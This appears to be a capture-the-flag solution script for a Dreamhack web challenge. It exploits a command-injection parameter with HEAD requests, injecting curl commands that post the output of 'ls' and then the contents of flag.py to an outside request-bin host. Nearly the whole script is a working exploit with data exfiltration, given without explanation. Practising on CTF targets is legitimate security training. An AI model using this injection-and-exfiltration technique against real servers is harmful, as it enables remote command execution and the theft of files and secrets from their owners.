import requests

HOST = "http://host1.dreamhack.games"
PORT = 12345
REQUEST_BIN = "https://example.request.dreamhack.games"

res = requests.options(f"{HOST}:{PORT}/")
# print(res.headers) # Allows HEAD, GET, OPTIONS

res = requests.head(
    f"{HOST}:{PORT}/",
    params={"cmd": f'curl -X POST -d "$(ls)" {REQUEST_BIN}'},
)
# Check your request bin!

# app.py flag.py requirements.txt
res = requests.head(
    f"{HOST}:{PORT}/",
    params={"cmd": f'curl -X POST -d "$(cat flag.py)" {REQUEST_BIN}'},
)
# Check your request bin!
